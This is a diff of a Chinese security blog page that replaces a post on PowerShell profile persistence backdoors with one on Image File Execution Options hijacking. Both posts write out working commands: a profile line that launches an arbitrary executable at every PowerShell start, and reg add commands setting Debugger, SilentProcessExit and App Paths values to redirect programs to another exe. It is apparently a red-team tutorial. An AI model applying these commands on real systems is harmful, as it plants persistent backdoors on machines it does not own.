@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>Powershell配置文件-持久性后门 | 九世的博客</title>
-  <meta name="keywords" content=" 权限维持 ">
-  <meta name="description" content="Powershell配置文件-持久性后门 | 九世的博客">
+  <title>映像劫持的新老玩法 | 九世的博客</title>
+  <meta name="keywords" content=" 后门 ">
+  <meta name="description" content="映像劫持的新老玩法 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1296,9 +1296,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-Powershell配置文件-持久性后门" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-映像劫持的新老玩法" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">Powershell配置文件-持久性后门</h1>
+        <h1 class="article-title">映像劫持的新老玩法</h1>
     
     <div class="article-meta">
         
@@ -1307,14 +1307,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color5">权限维持</a>
+            <a href="javascript:" class="color3">后门</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-11-07 16:47:41">2019-11-07 16:12</time>
+        创建时间:<time class="date" title="更新时间: 2020-02-23 21:22:05">2020-02-23 21:08</time>
         
     </div>
     <div class="article-meta">
@@ -1336,7 +1336,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#实验过程"><span class="toc-text">实验过程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#image-hijack"><span class="toc-text">image hijack</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1351,36 +1351,26 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p>powershell配置文件后门，通过设置配置文件后门可以实现每次powershell启动时。执行指定的恶意操作<br><img src="https://s2.ax1x.com/2019/11/07/MkN7Yq.png" alt="MkN7Yq.png"></p>
-<h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><pre><code class="powershell">echo $profile #输出配置文件的路径
-Test-Path $profile #判断配置文件是否存在，如果返回为False代表不存在，返回True则存在
-New-Item -Path $profile -Type File –Force #新建一个配置文件
-$string = &#39;Start-Process &quot;C:\tmp\pentestlab.exe&quot;&#39; #要启动的恶意程序
-$string | Out-File -FilePath &quot;C:\Users\&lt;User&gt;\Documents\WindowsPowerShell\Microsoft.PowerShe
-ll_profile.ps1&quot; -Append  #写入配置文件
-</code></pre>
-<p><img src="https://s2.ax1x.com/2019/11/07/MkUl1f.png" alt=""></p>
-<p><img src="https://s2.ax1x.com/2019/11/07/MkUahq.png" alt="MkUahq.png"></p>
-<p>测试结果<br><img src="https://s2.ax1x.com/2019/11/07/MkU03V.gif" alt="MkU03V.gif"></p>
-<p>自动写入的ps1脚本</p>
-<pre><code class="powershell">Write-Host -NoNewline [*] New powershell config;
-New-Item -Path $profile -Type File –Force;
-$path=$profile;
-Write-Host [*] config path: $path;
-$sets=Test-Path $profile;
-if($sets -eq &quot;True&quot;){
-    Write-Host [*] New config ok;
-    $payload=&#39;Start-Process &quot;C:\Windows\System32\notepad.exe&quot;&#39;
-    $payload | Out-File -FilePath $path;
-    Write-Host [+] write powershell config ok !!!
-}else{
-    Write-Host -NoNewline [-] New config False...;
-    exit(1);
-}
-</code></pre>
-<p><img src="https://s2.ax1x.com/2019/11/07/MkrEG9.gif" alt=""></p>
-<p>当然你也可以用这个方法来实现无文件攻击</p>
-<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://pentestlab.blog/2019/11/05/persistence-powershell-profile/" target="_blank" rel="noopener">Persistence – PowerShell Profile | Penetration Testing Lab</a></p>
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=440073051&auto=1&height=66"></iframe>
+
+<h2 id="image-hijack"><a href="#image-hijack" class="headerlink" title="image hijack"></a>image hijack</h2><p>映像劫持（IFEO）</p>
+<p>作用：劫持对应的程序后，打开该程序运行的是别的程序，比如运行A.exe打开的则是CALC.exe<br>注册表路径：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options<br>用法：在注册表路径下创建一个项，项名为要劫持的exe名称，并在该项创建一个Debugger的键值，键值填运行的恶意EXE。或者在已经创建的项里创建Debugger键填入键值，运行那个exe就会被劫持</p>
+<pre><code>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v Debugger /t REG_SZ /d C:\Windows\System32\calc.exe
+</code></pre><p><img src="https://s2.ax1x.com/2020/02/23/339V61.png" alt=""></p>
+<p>效果图：<br><img src="https://s2.ax1x.com/2020/02/23/339lfH.gif" alt=""></p>
+<p>映像劫持新玩法：</p>
+<p><a href="https://www.anquanke.com/post/id/151425" target="_blank" rel="noopener">https://www.anquanke.com/post/id/151425</a><br>效果：程序A静默退出结束后，会执行程序B。<br>注册表路径：</p>
+<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\&lt;劫持的exe名称&gt;
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\&lt;劫持的exe名称&gt;
+</code></pre><p>劫持notepad.exe示例：</p>
+<pre><code>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot; /v notepad.exe /t REG_DWORD /d 512
+reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v MonitorProcess /t REG_SZ /d C:\Windows\System32\calc.exe
+reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1
+</code></pre><p><img src="https://s2.ax1x.com/2020/02/23/339gBV.gif" alt=""></p>
+<p>代替映像劫持的注册表路径</p>
+<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\&lt;要劫持的exe名&gt;
+</code></pre><p>Defualt键值为要运行的恶意exe路径<br><img src="https://s2.ax1x.com/2020/02/23/33CSgA.md.png" alt=""></p>
+<p><img src="https://s2.ax1x.com/2020/02/23/33CpjI.gif" alt=""></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1390,12 +1380,12 @@ if($sets -eq &quot;True&quot;){
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Powershell配置文件-持久性后门</p>
+    <p><span class="copy-title">文章标题:</span>映像劫持的新老玩法</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-11-07, 16:12:33</p>
-    <p><span class="copy-title">最后更新:</span>2019-11-07, 16:47:41</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/3327c145.html" title="Powershell配置文件-持久性后门">http://422926799.github.io/posts/3327c145.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-02-23, 21:08:35</p>
+    <p><span class="copy-title">最后更新:</span>2020-02-23, 21:22:05</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/9a523925.html" title="映像劫持的新老玩法">http://422926799.github.io/posts/9a523925.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
